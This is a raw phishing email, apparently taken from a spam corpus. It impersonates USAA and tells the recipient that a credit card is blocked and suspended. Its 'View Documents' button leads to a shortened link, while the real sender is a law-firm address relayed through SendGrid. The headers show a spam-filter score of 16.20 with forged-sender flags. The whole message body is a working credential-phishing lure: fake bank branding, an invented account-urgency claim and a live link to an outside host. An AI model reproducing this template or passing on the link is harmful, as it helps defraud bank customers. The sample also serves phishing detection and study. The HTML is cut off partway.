@@ -1,0 +1,530 @@
+Return-Path: bounces+30554260-cb35-jose=monkey.org@sendgrid.net
+Delivered-To: jose@monkey.org
+X-FDA: 80209224354.07.1FEC53E
+Received: from wfbtxkpf.outbound-mail.sendgrid.net
+ (wfbtxkpf.outbound-mail.sendgrid.net [159.183.161.63])	by
+ imf28.b.hostedemail.com (Postfix) with ESMTP id DD1EB18CA1CB8	for
+ <jose@monkey.org>; Mon,  5 Dec 2022 19:22:36 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=sendgrid.net;
+	h=content-type:mime-version:subject:from:to:cc:content-type:from:
+	subject:to;
+	s=smtpapi; bh=jMtTaEcjE/RlMZ+YjttDbvSaoLgZEPUgzuznmr3Hfnw=;
+	b=PLk9iY0X2YtxKxuYkXBvVI5N3x7jL7alEdwC5ruANTXQbD7n/sBE+OPhZuwMooWFsZaB
+	nGwKYfFHyAYEYGtkYMSG5Qcz9ktuPJcl4lGj5nJ9eieZzF0QyB7deY1mnfjMkYvFpPH6e7
+	Vz0F1Uj7TJ1+F3V4iL8YxVveq+JfOUQVU=
+Received: by filterdrecv-849b969bc5-vw8vd with SMTP id
+ filterdrecv-849b969bc5-vw8vd-1-638E44FC-C        2022-12-05
+ 19:22:36.236216061 +0000 UTC m=+1541668.317812527
+Received: from [194.9.178.71] (unknown)
+	by geopod-ismtpd-5-1 (SG) with ESMTP
+	id Bz8F_y6TSUyQPF7odhJrSQ
+	Mon, 05 Dec 2022 19:22:36.012 +0000 (UTC)
+Content-Type: multipart/alternative; boundary="===============0122540534=="
+MIME-Version: 1.0
+Subject: New Document From USAA
+From: "USAA.Web.Services" <ben@westbrooklawfirm.com>
+Date: Mon, 05 Dec 2022 19:22:36 +0000 (UTC)
+Message-ID: <Bz8F_y6TSUyQPF7odhJrSQ@geopod-ismtpd-5-1>
+X-SG-EID: 
+ =?us-ascii?Q?SOPWp5K7ld3HGzAE+uUPNMQvVZbMF+JD8vlCdOI+PvWxpTDc0ekn3cc04gmHP8?=
+ =?us-ascii?Q?oHQiGwcTleJ5XSTN9cTpdAHsRkVaaW73jKboXlS?=
+ =?us-ascii?Q?Yt4aPi+jR9yaQAHqskHIdEDU5vCrk2VocnId45L?=
+ =?us-ascii?Q?b3bboZMonJHjVRkRMwxePpHyfKJs10FL9sbcIPO?=
+ =?us-ascii?Q?ZCLnlcJG4yVSqoA29nOF42KBnGhEy1XfGYPg7KY?=
+ =?us-ascii?Q?siGdo+=2F+f7kM4cm25m73tZOV9uZSr0760CWLI1?=
+To: Recipients <ben@westbrooklawfirm.com>
+X-Entity-ID: ybr7WjBDO1/fNVzKxk3uaQ==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1670268156;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=jMtTaEcjE/RlMZ+YjttDbvSaoLgZEPUgzuznmr3Hfnw=;
+	b=B1z/6KzOWsQ1FRouqyN6qAvaxeJhmbY8hpMh8l0dR9Xgu/f2T3tJ/V4/w2AbJ26yKDU7b3
+	4rSu7WuZt0WYfA8Bk/xZonqUp+xMThkPLz17g76U1/+RKGjXzyuEPq3VrTK2OJsZzoMX3C
+	V9RQ5kCcKFP3CSS3mbfczIXjAjRoMp0=
+ARC-Authentication-Results: i=1;	imf28.b.hostedemail.com;	dkim=pass
+ header.d=sendgrid.net header.s=smtpapi header.b=PLk9iY0X;	spf=pass
+ (imf28.b.hostedemail.com: domain of
+ "bounces+30554260-cb35-jose=monkey.org@sendgrid.net" designates
+ 159.183.161.63 as permitted sender)
+ smtp.mailfrom="bounces+30554260-cb35-jose=monkey.org@sendgrid.net";
+	dmarc=none
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1670268156; a=rsa-sha256;
+	cv=none;
+	b=nGJnJFQoWMgj3XVFD0d6zpCWtBKVhx9k4AjAxDPBZkb1hBpSB+kb4GojRmtLf+qL2e0L0o
+	P5d+X9FBMSXoDRVV1NCmyX4FvavTuCUI0EL/FMONNdFoxodw9XYBAP0Lddg9GMmJ6110CI
+	IePrPceAwWFSp0RXcKudgZ3/pHR7RT8=
+X-Rspamd-Queue-Id: DD1EB18CA1CB8
+X-Spamd-Result: default: False [16.20 / 9.00];
+	TC_DBL_BL_100(5.00)[s.id:url];
+	FORGED_RECIPIENTS(4.00)[m:ben@westbrooklawfirm.com,s:jose@monkey.org];
+	URIBL_DBL_BL(3.00)[sendgrid.net:dkim];
+	TO_DN_RECIPIENTS(2.00)[];
+	URI_COUNT_ODD(1.00)[11];
+	MID_RHS_NOT_FQDN(0.50)[];
+	FORGED_SENDER(0.30)[ben@westbrooklawfirm.com,bounces@sendgrid.net];
+	MANY_INVISIBLE_PARTS(0.30)[4];
+	RCVD_NO_TLS_LAST(0.10)[];
+	BAD_REP_POLICIES(0.10)[];
+	MIME_GOOD(-0.10)[multipart/alternative,text/plain];
+	BAYES_HAM(-0.00)[30.11%];
+	R_SPF_ALLOW(0.00)[+ip4:159.183.0.0/16:c];
+	DMARC_NA(0.00)[westbrooklawfirm.com];
+	RCPT_COUNT_ONE(0.00)[1];
+	FROM_HAS_DN(0.00)[];
+	FROM_NEQ_ENVFROM(0.00)[ben@westbrooklawfirm.com,bounces@sendgrid.net];
+	TAGGED_FROM(0.00)[30554260-cb35-jose=monkey.org];
+	ARC_NA(0.00)[];
+	TO_DN_ALL(0.00)[];
+	ARC_SIGNED(0.00)[hostedemail.com:s=arc-20220608:i=1];
+	R_DKIM_ALLOW(0.00)[sendgrid.net:s=smtpapi];
+	DKIM_TRACE(0.00)[sendgrid.net:+];
+	MIME_TRACE(0.00)[0:+,1:+,2:~];
+	TO_EQ_FROM(0.00)[];
+	HAS_SG_EID(0.00)[];
+	RCVD_COUNT_TWO(0.00)[2]
+X-Rspam-User: 
+Authentication-Results: imf28.b.hostedemail.com;	dkim=pass
+ header.d=sendgrid.net header.s=smtpapi header.b=PLk9iY0X;	spf=pass
+ (imf28.b.hostedemail.com: domain of
+ "bounces+30554260-cb35-jose=monkey.org@sendgrid.net" designates
+ 159.183.161.63 as permitted sender)
+ smtp.mailfrom="bounces+30554260-cb35-jose=monkey.org@sendgrid.net";
+	dmarc=none
+X-Rspamd-Server: rspam09
+X-Spam-Status: Yes, score=16.20
+X-Stat-Signature: 18w81itjefneehu59t4xe6ah719jgfz8
+X-HE-Tag: 1670268156-263663
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 230
+
+You will not see this in a MIME-aware mail reader.
+--===============0122540534==
+Content-Type: text/plain; charset=us-ascii
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+
+  =20
+=20
+   	 	 =20
+    	  	 =20
+   =20
+   	=20
+  	=20
+  	=20
+	 =20
+   USAA SECURITY ZONE=20
+USAA # ending in:0083
+	 =20
+  =20
+ =20
+ =20
+	 	=20
+  	 	=20
+  New Documents for You
+
+
+  	 	    =20
+ Dear Customer,
+ =20
+ Please take a few minutes to review the following new documents that we've=
+ posted for you:
+ =20
+ =20
+Credit Card Authorized User Blocked
+ =20
+Credit Card Temporary Suspension=20
+ =20
+ =20
+    =20
+ View Documents
+ =20
+
+ =20
+ Thank you,
+ USAA
+ =20
+ USAA means United Services Automobile Association and its insurance, banki=
+ng and other companies. Banks Member FDIC.
+=20
+    a
+
+	 	=20
+ =20
+  	 	 =20
+  =20
+   	 	 Go Paperless
+
+=20
+   =20
+    	  	          =20
+	 	=20
+  	 	 =20
+  =20
+   Please do not reply to this e-mail.
+   To contact USAA, visit our secure contact page.
+
+   Privacy Promise
+
+   United Services Automobile Association, 9800 Fredericksburg Road, San An=
+tonio, Texas 78288
+
+   =20
+	 =20
+	 	  =20
+    	 	     =20
+	 	  =20
+ =20=
+
+--===============0122540534==
+Content-Type: text/html; charset=us-ascii
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+<HTML><head><meta http-equiv=3D"Content-Type" content=3D"text/html; charset=
+=3Diso-8859-1"/></head><BODY><TABLE cellSpacing=3D0 cellPadding=3D0 width=
+=3D650 border=3D0>
+<TBODY>
+<TR height=3D25>
+<TD bgColor=3D#ffffff vAlign=3Dmiddle colSpan=3D5 align=3Dleft><FONT style=
+=3D"FONT-SIZE: 9px; COLOR: #000000" face=3D"Arial, sans-serif"></FONT></TD>=
+</TR></TBODY></TABLE>
+<TABLE role=3Dpresentation cellSpacing=3D0 cellPadding=3D0 width=3D650 bgCo=
+lor=3D#12395b border=3D0>
+<TBODY>
+<TR height=3D90>
+<TD width=3D20></TD>
+<TD width=3D5></TD>
+<TD width=3D600>
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D613 border=3D0>
+<TBODY>
+<TR>
+<TD height=3D45 vAlign=3Dmiddle width=3D28 align=3Dcenter><IMG style=3D"VIS=
+IBILITY: visible" border=3D0 alt=3D"" src=3D"https://ecp.yusercontent.com/m=
+ail?url=3Dhttps%3A%2F%2Fcontent.usaa.com%2Fmcontent%2Fstatic_assets%2Fom%2F=
+Media%2FRed_Strip_New.jpg&amp;t=3D1650467084&amp;ymreqid=3Df3f0ef5e-b128-9c=
+cf-2f2c-5a033601a800&amp;sig=3Dk.tUSEwC9NfFSO2Q7LWf.A--~D" width=3D10 heigh=
+t=3D90> </TD>
+<TD height=3D45 width=3D96><A href=3D"https://www.usaa.com/inet/ent_logon/L=
+ogon?EID=3D127927-0518_head" rel=3D"nofollow noopener noreferrer" target=3D=
+_blank><IMG style=3D"VISIBILITY: visible" border=3D0 alt=3D"USAA Logo" src=
+=3D"https://ecp.yusercontent.com/mail?url=3Dhttps%3A%2F%2Fcontent.usaa.com%=
+2Fmcontent%2Fstatic_assets%2Fom%2FMedia%2Fusaa_logo_white.jpg&amp;t=3D16504=
+67084&amp;ymreqid=3Df3f0ef5e-b128-9ccf-2f2c-5a033601a800&amp;sig=3DackzVc04=
+_drAJ5wXgnT9KQ--~D" width=3D73 height=3D80></A> </TD>
+<TD height=3D45 width=3D489 align=3Dright>
+<TABLE height=3D65 cellSpacing=3D0 cellPadding=3D0 width=3D188 align=3Drigh=
+t border=3D0>
+<TBODY>
+<TR>
+<TD width=3D22>
+<TABLE height=3D65 cellSpacing=3D0 cellPadding=3D0 width=3D22 border=3D0>
+<TBODY>
+<TR>
+<TD style=3D"LINE-HEIGHT: 0" height=3D29 vAlign=3Dtop width=3D8><IMG style=
+=3D"DISPLAY: block; VISIBILITY: visible" border=3D0 alt=3D"" src=3D"https:/=
+/ecp.yusercontent.com/mail?url=3Dhttp%3A%2F%2Fcontent.usaa.com%2Fmcontent%2=
+Fstatic_assets%2Fom%2FMedia%2Fthumbnails%2Femail_sec_5-1.gif&amp;t=3D165046=
+7084&amp;ymreqid=3Df3f0ef5e-b128-9ccf-2f2c-5a033601a800&amp;sig=3DFDBMFx4yh=
+EffxATv6EpoZw--~D" width=3D8 height=3D29></TD>
+<TD style=3D"LINE-HEIGHT: 0" bgColor=3D#ffffff height=3D29 vAlign=3Dtop wid=
+th=3D14><IMG style=3D"DISPLAY: block; VISIBILITY: visible" border=3D0 alt=
+=3D"" src=3D"https://ecp.yusercontent.com/mail?url=3Dhttp%3A%2F%2Fcontent.u=
+saa.com%2Fmcontent%2Fstatic_assets%2Fom%2FMedia%2Fthumbnails%2Femail_sec_5-=
+2.gif&amp;t=3D1650467084&amp;ymreqid=3Df3f0ef5e-b128-9ccf-2f2c-5a033601a800=
+&amp;sig=3DgePiZ9dvkF6ybA5znYgkjg--~D" width=3D14 height=3D29></TD></TR>
+<TR>
+<TD style=3D"LINE-HEIGHT: 0" height=3D29 vAlign=3Dtop width=3D8><IMG style=
+=3D"DISPLAY: block; VISIBILITY: visible" border=3D0 alt=3D"" src=3D"https:/=
+/ecp.yusercontent.com/mail?url=3Dhttps%3A%2F%2Fcontent.usaa.com%2Fmcontent%=
+2Fstatic_assets%2FMedia%2Femail_sec_spacer.gif&amp;t=3D1650467084&amp;ymreq=
+id=3Df3f0ef5e-b128-9ccf-2f2c-5a033601a800&amp;sig=3DDiCwEMEbsR3AP6L8mGtj7g-=
+-~D" width=3D8 height=3D29></TD>
+<TD style=3D"LINE-HEIGHT: 0" bgColor=3D#ffffff height=3D29 vAlign=3Dtop wid=
+th=3D14><IMG style=3D"DISPLAY: block; VISIBILITY: visible" border=3D0 alt=
+=3D"" src=3D"https://ecp.yusercontent.com/mail?url=3Dhttps%3A%2F%2Fcontent.=
+usaa.com%2Fmcontent%2Fstatic_assets%2FMedia%2Femail_sec_spacer.gif&amp;t=3D=
+1650467084&amp;ymreqid=3Df3f0ef5e-b128-9ccf-2f2c-5a033601a800&amp;sig=3DDiC=
+wEMEbsR3AP6L8mGtj7g--~D" width=3D14 height=3D29></TD></TR>
+<TR>
+<TD style=3D"LINE-HEIGHT: 0" height=3D7 vAlign=3Dbottom width=3D8></TD>
+<TD style=3D"LINE-HEIGHT: 0" bgColor=3D#ffffff height=3D7 vAlign=3Dbottom w=
+idth=3D14><IMG style=3D"DISPLAY: block; VISIBILITY: visible" border=3D0 alt=
+=3D"" src=3D"https://ecp.yusercontent.com/mail?url=3Dhttp%3A%2F%2Fcontent.u=
+saa.com%2Fmcontent%2Fstatic_assets%2Fom%2FMedia%2Fthumbnails%2Femail_sec_6-=
+1.gif&amp;t=3D1650467084&amp;ymreqid=3Df3f0ef5e-b128-9ccf-2f2c-5a033601a800=
+&amp;sig=3DD9Y8W3yiJ5W9B1g6S86a9g--~D" width=3D14 height=3D7></TD></TR></TB=
+ODY></TABLE></TD>
+<TD bgColor=3D#ffffff align=3Dleft>
+<TABLE height=3D65 cellSpacing=3D0 cellPadding=3D5 width=3D"100%" border=3D=
+0>
+<TBODY>
+<TR>
+<TD style=3D"FONT-SIZE: 9px; TEXT-ALIGN: left; LINE-HEIGHT: 12px" vAlign=3D=
+middle align=3Dleft><FONT style=3D"FONT-SIZE: 10px; COLOR: #00365b" face=3D=
+"Arial, Helvetica, sans-serif"><STRONG>USAA SECURITY ZONE</STRONG></FONT> <=
+BR><FONT style=3D"FONT-SIZE: 9px; COLOR: #00365b" face=3D"Arial, Helvetica,=
+ sans-serif">USAA # ending in:0083</FONT></TD></TR></TBODY></TABLE></TD>
+<TD bgColor=3D#ffffff width=3D7>
+<TABLE height=3D65 cellSpacing=3D0 cellPadding=3D0 width=3D7 border=3D0>
+<TBODY>
+<TR>
+<TD style=3D"LINE-HEIGHT: 0" bgColor=3D#ffffff height=3D7 vAlign=3Dtop widt=
+h=3D7 align=3Dright><IMG style=3D"DISPLAY: block; VISIBILITY: visible" bord=
+er=3D0 alt=3D"" src=3D"https://ecp.yusercontent.com/mail?url=3Dhttp%3A%2F%2=
+Fcontent.usaa.com%2Fmcontent%2Fstatic_assets%2Fom%2FMedia%2Fthumbnails%2Fem=
+ail_sec_5-3.gif&amp;t=3D1650467084&amp;ymreqid=3Df3f0ef5e-b128-9ccf-2f2c-5a=
+033601a800&amp;sig=3DPSvqwB8AnR4QolmzMkMHWg--~D" width=3D7 height=3D7></TD>=
+</TR>
+<TR>
+<TD style=3D"LINE-HEIGHT: 0" bgColor=3D#ffffff height=3D51 vAlign=3Dtop wid=
+th=3D7 align=3Dright><IMG style=3D"DISPLAY: block; VISIBILITY: visible" bor=
+der=3D0 alt=3D"" src=3D"https://ecp.yusercontent.com/mail?url=3Dhttps%3A%2F=
+%2Fcontent.usaa.com%2Fmcontent%2Fstatic_assets%2FMedia%2Femail_sec_spacer.g=
+if&amp;t=3D1650467084&amp;ymreqid=3Df3f0ef5e-b128-9ccf-2f2c-5a033601a800&am=
+p;sig=3DDiCwEMEbsR3AP6L8mGtj7g--~D" width=3D7 height=3D51></TD></TR>
+<TR>
+<TD style=3D"LINE-HEIGHT: 0" bgColor=3D#ffffff height=3D7 vAlign=3Dbottom w=
+idth=3D7 align=3Dright><IMG style=3D"DISPLAY: block; VISIBILITY: visible" b=
+order=3D0 alt=3D"" src=3D"https://ecp.yusercontent.com/mail?url=3Dhttp%3A%2=
+F%2Fcontent.usaa.com%2Fmcontent%2Fstatic_assets%2Fom%2FMedia%2Fthumbnails%2=
+Femail_sec_6-2.gif&amp;t=3D1650467084&amp;ymreqid=3Df3f0ef5e-b128-9ccf-2f2c=
+-5a033601a800&amp;sig=3DJClVjZs8kVFJ2Gm6ckmoEQ--~D" width=3D7 height=3D7></=
+TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE=
+></TD>
+<TD width=3D5></TD>
+<TD width=3D20></TD></TR>
+<TR>
+<TD width=3D20></TD>
+<TD bgColor=3D#ffffff width=3D5></TD>
+<TD bgColor=3D#ffffff height=3D30 width=3D600 colSpan=3D2 align=3Dleft><BR>=
+<FONT style=3D"FONT-SIZE: 18px; COLOR: #12395b" face=3D"Arial, sans-serif">=
+<B>&nbsp;&nbsp;New Documents for You</B><BR><BR></FONT></TD></TR>
+<TR>
+<TD width=3D20></TD>
+<TD bgColor=3D#ffffff width=3D5></TD>
+<TD bgColor=3D#ffffff width=3D600 align=3Dleft><FONT style=3D"FONT-SIZE: 12=
+px; COLOR: #000000" face=3DArial>
+<DIV class=3Dyiv2086723691Section1>
+<DIV style=3D"MARGIN-LEFT: 1em; MARGIN-RIGHT: 1em">
+<P class=3Dyiv2086723691normal style=3D"MARGIN-BOTTOM: 0pt; MARGIN-TOP: 0pt=
+; FONT-STYLE: normal"><SPAN style=3D"FONT-FAMILY: 'Arial'; COLOR: #333333">=
+<SPAN></SPAN></SPAN><SPAN style=3D"FONT-FAMILY: 'Arial'; COLOR: #333333"></=
+SPAN>&nbsp;</P>
+<P class=3Dyiv2086723691normal style=3D"MARGIN-BOTTOM: 0pt; MARGIN-TOP: 0pt=
+; FONT-STYLE: normal"><SPAN style=3D"FONT-FAMILY: 'Arial'; COLOR: #333333">=
+Dear </SPAN><SPAN style=3D"FONT-FAMILY: 'Arial'"><SPAN class=3Dyiv208672369=
+1DLSVAR>Customer</SPAN></SPAN><SPAN style=3D"FONT-FAMILY: 'Arial'; COLOR: #=
+333333">,<SPAN></SPAN></SPAN><SPAN style=3D"FONT-FAMILY: 'Arial'; COLOR: #3=
+33333"></SPAN></P>
+<P class=3Dyiv2086723691normal style=3D"MARGIN-BOTTOM: 0pt; MARGIN-TOP: 0pt=
+; FONT-STYLE: normal"><SPAN style=3D"FONT-FAMILY: 'Arial'; COLOR: #333333">=
+<SPAN></SPAN></SPAN><SPAN style=3D"FONT-FAMILY: 'Arial'; COLOR: #333333"></=
+SPAN>&nbsp;</P>
+<P class=3Dyiv2086723691normal style=3D"MARGIN-BOTTOM: 0pt; MARGIN-TOP: 0pt=
+; FONT-STYLE: normal"><SPAN style=3D"FONT-FAMILY: 'Arial'; COLOR: #333333">=
+Please take a few minutes to review the following new </SPAN><SPAN style=3D=
+"FONT-FAMILY: 'Arial'"><SPAN class=3Dyiv2086723691DLSVAR>documents</SPAN></=
+SPAN><SPAN style=3D"FONT-FAMILY: 'Arial'; COLOR: #333333"> that we've poste=
+d for you:<SPAN></SPAN></SPAN><SPAN style=3D"FONT-FAMILY: 'Arial'; COLOR: #=
+333333"></SPAN></P>
+<P class=3Dyiv2086723691normal style=3D"MARGIN-BOTTOM: 0pt; MARGIN-TOP: 0pt=
+; FONT-STYLE: normal; LINE-HEIGHT: 6pt"><SPAN style=3D"FONT-FAMILY: 'Arial'=
+; COLOR: #333333"><SPAN></SPAN></SPAN><SPAN style=3D"FONT-FAMILY: 'Arial'; =
+COLOR: #333333"></SPAN>&nbsp;</P>
+<UL type=3Ddisc>
+<LI class=3Dyiv2086723691normal style=3D"MARGIN-BOTTOM: 0pt; MARGIN-TOP: 0p=
+t; COLOR: #333333; FONT-STYLE: normal; MARGIN-LEFT: 36pt"><SPAN class=3Dyiv=
+2086723691DLSVAR style=3D"MARGIN-BOTTOM: 0pt; MARGIN-TOP: 0pt; TEXT-TRANSFO=
+RM: none; TEXT-ALIGN: left">Credit Card Authorized User Blocked</SPAN></LI>=
+</UL>
+<UL type=3Ddisc>
+<LI class=3Dyiv2086723691normal style=3D"MARGIN-BOTTOM: 0pt; MARGIN-TOP: 0p=
+t; COLOR: #333333; FONT-STYLE: normal; MARGIN-LEFT: 36pt"><SPAN class=3Dyiv=
+2086723691DLSVAR style=3D"MARGIN-BOTTOM: 0pt; MARGIN-TOP: 0pt; TEXT-TRANSFO=
+RM: none; TEXT-ALIGN: left">Credit Card Temporary Suspension </SPAN></LI></=
+UL>
+<P class=3Dyiv2086723691normal style=3D"MARGIN-BOTTOM: 0pt; FONT-STYLE: nor=
+mal; LINE-HEIGHT: 4pt"><SPAN style=3D"COLOR: #333333"><SPAN></SPAN></SPAN><=
+SPAN style=3D"COLOR: #333333"></SPAN>&nbsp;</P>
+<DIV align=3Dcenter>
+<TABLE class=3Dyiv2086723691normal style=3D"BACKGROUND: #54732d; BORDER-COL=
+LAPSE: collapse; FONT-STYLE: normal">
+<TBODY>
+<TR style=3D"MIN-HEIGHT: 27pt">
+<TD style=3D"BORDER-TOP: medium none; BORDER-RIGHT: medium none; WIDTH: 2.3=
+in; BORDER-BOTTOM: medium none; PADDING-BOTTOM: 0in; PADDING-TOP: 0in; PADD=
+ING-LEFT: 5pt; MIN-HEIGHT: 27pt; BORDER-LEFT: medium none; PADDING-RIGHT: 5=
+pt">
+<P class=3Dyiv2086723691normal style=3D"MARGIN-BOTTOM: 0pt; MARGIN-TOP: 0pt=
+; FONT-STYLE: normal; TEXT-ALIGN: center"><B><SPAN style=3D"FONT-SIZE: 5pt;=
+ FONT-FAMILY: 'Arial'; COLOR: white"><SPAN></SPAN></SPAN></B><B style=3D"FO=
+NT-SIZE: 5pt; FONT-FAMILY: 'Arial'; COLOR: white"></B>&nbsp;</P>
+<P class=3Dyiv2086723691normal style=3D"MARGIN-BOTTOM: 0pt; MARGIN-TOP: 0pt=
+; FONT-STYLE: normal; TEXT-ALIGN: center"><B><SPAN style=3D"FONT-FAMILY: 'A=
+rial'; COLOR: white"><A style=3D"TEXT-DECORATION: none; COLOR: blue" href=
+=3D"https://vk.sv/Dif3-K" rel=3D"nofollow noopener noreferrer" target=3D_bl=
+ank><SPAN style=3D"COLOR: white"><SPAN class=3Dyiv2086723691DLSVAR>View&nbs=
+p;Documents</SPAN></SPAN></A></SPAN></B><SPAN style=3D"COLOR: white"><SPAN>=
+</SPAN></SPAN></P>
+<P class=3Dyiv2086723691normal style=3D"MARGIN-BOTTOM: 0pt; MARGIN-TOP: 0pt=
+; FONT-STYLE: normal; TEXT-ALIGN: center"><SPAN style=3D"FONT-SIZE: 5pt"><S=
+PAN></SPAN></SPAN><SPAN style=3D"FONT-SIZE: 5pt"></SPAN>&nbsp;</P></TD></TR=
+></TBODY></TABLE></DIV>
+<P class=3Dyiv2086723691normal style=3D"MARGIN-BOTTOM: 0pt; MARGIN-TOP: 0pt=
+; FONT-STYLE: normal"><SPAN style=3D"FONT-FAMILY: 'Arial'; COLOR: #333333">=
+<SPAN></SPAN></SPAN><SPAN style=3D"FONT-FAMILY: 'Arial'; COLOR: #333333"></=
+SPAN>&nbsp;</P>
+<P class=3Dyiv2086723691normal style=3D"MARGIN-BOTTOM: 0pt; MARGIN-TOP: 0pt=
+; FONT-STYLE: normal"><SPAN style=3D"FONT-FAMILY: 'Arial'; COLOR: #333333">=
+Thank you,<SPAN></SPAN></SPAN><SPAN style=3D"FONT-FAMILY: 'Arial'; COLOR: #=
+333333"></SPAN></P>
+<P class=3Dyiv2086723691normal style=3D"MARGIN-BOTTOM: 0pt; MARGIN-TOP: 0pt=
+; FONT-STYLE: normal"><SPAN style=3D"FONT-FAMILY: 'Arial'; COLOR: #333333">=
+USAA<SPAN></SPAN></SPAN><SPAN style=3D"FONT-FAMILY: 'Arial'; COLOR: #333333=
+"></SPAN></P>
+<P class=3Dyiv2086723691normal style=3D"MARGIN-BOTTOM: 0pt; MARGIN-TOP: 0pt=
+; FONT-STYLE: normal"><SPAN style=3D"FONT-FAMILY: 'Arial'; COLOR: #333333">=
+<SPAN></SPAN></SPAN><SPAN style=3D"FONT-FAMILY: 'Arial'; COLOR: #333333"></=
+SPAN>&nbsp;</P>
+<P class=3Dyiv2086723691normal style=3D"MARGIN-BOTTOM: 0pt; MARGIN-TOP: 0pt=
+; FONT-STYLE: normal"><SPAN style=3D"FONT-SIZE: 8pt; FONT-FAMILY: 'Arial'">=
+USAA means United Services Automobile Association and its insurance, bankin=
+g and other companies. Banks Member FDIC.<SPAN></SPAN></SPAN><SPAN style=3D=
+"FONT-SIZE: 8pt; FONT-FAMILY: 'Arial'"></SPAN></P></DIV>
+<TABLE class=3Dyiv2086723691normal style=3D"BORDER-COLLAPSE: collapse; FONT=
+-STYLE: normal">
+<TBODY>
+<TR>
+<TD style=3D"BORDER-TOP: medium none; BORDER-RIGHT: medium none; WIDTH: 7.1=
+5in; BORDER-BOTTOM: medium none; PADDING-BOTTOM: 0in; PADDING-TOP: 0in; PAD=
+DING-LEFT: 5pt; BORDER-LEFT: medium none; PADDING-RIGHT: 5pt" vAlign=3Dtop>
+<P class=3Dyiv2086723691normal style=3D"MARGIN-BOTTOM: 0pt; FONT-STYLE: nor=
+mal"><SPAN style=3D"COLOR: white">a<SPAN></SPAN></SPAN><SPAN style=3D"COLOR=
+: white"></SPAN></P></TD></TR></TBODY></TABLE></DIV></FONT></TD>
+<TD bgColor=3D#ffffff width=3D5></TD>
+<TD width=3D20></TD></TR>
+<TR height=3D15>
+<TD colSpan=3D5></TD></TR>
+<TR>
+<TD width=3D20></TD>
+<TD bgColor=3D#f2f2f2 width=3D5></TD>
+<TD bgColor=3D#f2f2f2 width=3D600 align=3Dleft>
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D600 align=3Dcenter border=3D=
+0>
+<TBODY>
+<TR height=3D5>
+<TD></TD></TR>
+<TR>
+<TD vAlign=3Dtop width=3D"20%" align=3Dright><IMG style=3D"VISIBILITY: visi=
+ble" border=3D0 alt=3D"Go Paperless" src=3D"https://ecp.yusercontent.com/ma=
+il?url=3Dhttp%3A%2F%2Fcontent.usaa.com%2Fmcontent%2Fstatic_assets%2Fom%2FMe=
+dia%2Fthumbnails%2FGopaperless_glass.gif&amp;t=3D1650467084&amp;ymreqid=3Df=
+3f0ef5e-b128-9ccf-2f2c-5a033601a800&amp;sig=3DZEI5mIgyDxqojCUrAMxSGQ--~D" w=
+idth=3D25 height=3D25> </TD>
+<TD width=3D"1%"></TD>
+<TD align=3Dleft><FONT style=3D"FONT-SIZE: 14px; COLOR: #325237; LINE-HEIGH=
+T: 18px" face=3D"Arial, sans-serif"><B>Go Paperless</B></FONT></TD></TR></T=
+BODY></TABLE><BR>
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D600 border=3D0>
+<TBODY>
+<TR>
+<TD width=3D"95%" align=3Dleft>
+<TABLE>
+<TBODY>
+<TR>
+<TD height=3D40 width=3D"40%" align=3Dleft><A href=3D"https://communities.u=
+saa.com/?EID=3D129481-0520_footer" rel=3D"nofollow noopener noreferrer" tar=
+get=3D_blank><IMG style=3D"VISIBILITY: visible" border=3D0 alt=3D"USAA Comm=
+unity" src=3D"https://ecp.yusercontent.com/mail?url=3Dhttps%3A%2F%2Fcontent=
+.usaa.com%2Fmcontent%2Fstatic_assets%2Fom%2FMedia%2FUSAA_CMTY_New.jpg&amp;t=
+=3D1650467084&amp;ymreqid=3Df3f0ef5e-b128-9ccf-2f2c-5a033601a800&amp;sig=3D=
+mx2ElmsDzmK5lausTljenA--~D" width=3D227 height=3D28></A> </TD>
+<TD height=3D30 width=3D"30%" align=3Dcenter><A href=3D"https://www.usaa.co=
+m/inet/pages/usaa_mobile_main?EID=3D127927-0518_footer" rel=3D"nofollow noo=
+pener noreferrer" target=3D_blank><IMG style=3D"VISIBILITY: visible" border=
+=3D0 alt=3D"Go Mobile" src=3D"https://ecp.yusercontent.com/mail?url=3Dhttps=
+%3A%2F%2Fcontent.usaa.com%2Fmcontent%2Fstatic_assets%2Fom%2FMedia%2FGOMOBIL=
+E_New.jpg&amp;t=3D1650467084&amp;ymreqid=3Df3f0ef5e-b128-9ccf-2f2c-5a033601=
+a800&amp;sig=3DnsJxDkAHGX7IONb1qIv0hg--~D" width=3D76 height=3D28></A> </TD=
+>
+<TD height=3D30 width=3D"30%" align=3Dright><A href=3D"http://www.facebook.=
+com/USAA?EID=3D129481-0520_footer" rel=3D"nofollow noopener noreferrer" tar=
+get=3D_blank><IMG style=3D"VISIBILITY: visible" border=3D0 alt=3DFacebook s=
+rc=3D"https://ecp.yusercontent.com/mail?url=3Dhttps%3A%2F%2Fcontent.usaa.co=
+m%2Fmcontent%2Fstatic_assets%2Fom%2FMedia%2FFacebook_lightblue.jpg&amp;t=3D=
+1650467084&amp;ymreqid=3Df3f0ef5e-b128-9ccf-2f2c-5a033601a800&amp;sig=3DH9X=
+0UG3bRYC16U3egn4ZRw--~D" width=3D28 height=3D28></A>&nbsp;&nbsp; <A href=3D=
+"http://twitter.com/usaa?EID=3D129481-0520_footer" rel=3D"nofollow noopener=
+ noreferrer" target=3D_blank><IMG style=3D"VISIBILITY: visible" border=3D0 =
+alt=3DTwitter src=3D"https://ecp.yusercontent.com/mail?url=3Dhttps%3A%2F%2F=
+content.usaa.com%2Fmcontent%2Fstatic_assets%2Fom%2FMedia%2FTwitter_LightBlu=
+e.jpg&amp;t=3D1650467084&amp;ymreqid=3Df3f0ef5e-b128-9ccf-2f2c-5a033601a800=
